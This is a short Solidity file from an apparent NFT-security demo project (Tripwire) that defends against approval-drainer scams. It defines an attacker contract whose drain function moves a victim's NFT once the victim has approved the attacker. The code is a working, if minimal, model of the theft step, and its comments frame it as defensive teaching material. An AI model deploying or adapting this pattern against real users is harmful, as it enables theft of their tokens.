// SPDX-License-Identifier: LGPL-3.0-only
pragma solidity ^0.8.22;

import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

/// @dev The demo's attacker contract (#14). Represents the second half of
/// the real-world drainer pattern this whole project defends against: once
/// a victim has been tricked into calling `setApprovalForAll(attacker, true)`
/// on some NFT contract, this is what actually moves the tokens out.
///
/// Deliberately does nothing sneaky beyond that - the point of the demo is
/// that step one (the approval) is the moment Tripwire needs to catch,
/// because step two, by design, requires no further action from the victim
/// at all.
contract DrainerAttacker {
    event Drained(address indexed nft, address indexed victim, uint256 tokenId);

    function drain(address nft, address victim, uint256 tokenId) external {
        IERC721(nft).transferFrom(victim, address(this), tokenId);
        emit Drained(nft, victim, tokenId);
    }
}
